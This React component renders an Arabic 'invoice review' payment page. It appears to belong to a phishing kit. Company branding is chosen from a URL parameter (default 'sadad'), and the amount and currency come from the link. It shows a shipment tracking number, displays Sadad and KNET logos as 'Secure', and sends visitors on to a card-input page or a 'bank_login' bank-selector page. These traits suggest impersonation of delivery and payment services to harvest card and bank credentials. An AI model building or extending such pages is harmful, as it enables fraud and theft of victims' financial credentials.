import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink } from "@/hooks/useSupabase";
import { formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import PageLoader from "@/components/PageLoader";
import { Button } from "@/components/ui/button";
import { ShieldCheck, Info } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError } = useLink(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'sadad';
  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
  const shippingInfo = linkData?.payload as any;
  
  const amountParam = urlParams.get('amount');
  const currencyParam = urlParams.get('currency');
  const methodParam = urlParams.get('method') || urlParams.get('pm');
  const countryParam = urlParams.get('country');
  
  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";

  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
  let amountValue = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amountValue = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amountValue = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amountValue, currencyParam || countryCode);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري مراجعة تفاصيل الفاتورة..." />;
  }
  
  const Layout = getCompanyLayout(serviceKey);

  const handleProceed = () => {
    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
    const nextUrl = paymentMethod === 'bank_login' 
      ? `/pay/${id}/bank-selector?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amountValue}`
      : `/pay/${id}/card-input?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amountValue}`;
    navigate(nextUrl);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`مراجعة الفاتورة - ${serviceName}`}
        amount={formattedAmount}
      />

      <Layout companyKey={serviceKey} amount={formattedAmount}>
        <div className="space-y-6 text-right">
          <div className="border-b pb-4 mb-4">
            <h3 className="text-lg font-bold flex items-center gap-2 justify-end">
               تفاصيل الطلب 
               <Info className="w-5 h-5 text-gray-400" />
            </h3>
          </div>

          <div className="space-y-4 bg-white p-4">
            <div className="flex justify-between items-center py-2 border-b border-dashed">
              <span className="text-gray-500 text-sm">نوع الخدمة</span>
              <span className="font-bold">{serviceName}</span>
            </div>
            
            {shippingInfo?.tracking_number && (
              <div className="flex justify-between items-center py-2 border-b border-dashed">
                <span className="text-gray-500 text-sm">رقم الشحنة / المرجع</span>
                <span className="font-bold text-blue-600">{shippingInfo.tracking_number}</span>
              </div>
            )}

            {shippingInfo?.customerInfo?.name && (
              <div className="flex justify-between items-center py-2 border-b border-dashed">
                <span className="text-gray-500 text-sm">اسم العميل</span>
                <span className="font-bold">{shippingInfo.customerInfo.name}</span>
              </div>
            )}

            <div className="bg-gray-50 p-4 mt-6 border border-gray-200">
               <div className="flex justify-between items-center mb-2">
                 <span className="text-gray-600 font-bold">المجموع الفرعي</span>
                 <span>{formattedAmount}</span>
               </div>
               <div className="flex justify-between items-center mb-2 text-green-600">
                 <span className="font-bold">رسوم الخدمة</span>
                 <span>0.00</span>
               </div>
               <div className="flex justify-between items-center pt-2 border-t-2 border-gray-300">
                 <span className="text-xl font-black">الإجمالي</span>
                 <span className="text-2xl font-black text-[#EF7622]">{formattedAmount}</span>
               </div>
            </div>
          </div>

          <div className="pt-6">
            <Button
              onClick={handleProceed}
              className="w-full h-14 text-lg font-bold rounded-none bg-[#EF7622] hover:bg-[#d4661a] transition-all flex items-center justify-center gap-3"
            >
              <span>تأكيد ومتابعة الدفع</span>
              <ShieldCheck className="w-6 h-6" />
            </Button>
            
            <div className="flex items-center justify-center gap-4 mt-6 opacity-40 grayscale">
               <img src="./assets/branding/logo-sadad.png" alt="Secure" className="h-6" />
               <img src="./assets/branding/logo-knet.png" alt="Secure" className="h-6" />
            </div>
          </div>
        </div>
      </Layout>
    </>
  );
};

export default PaymentDetails;
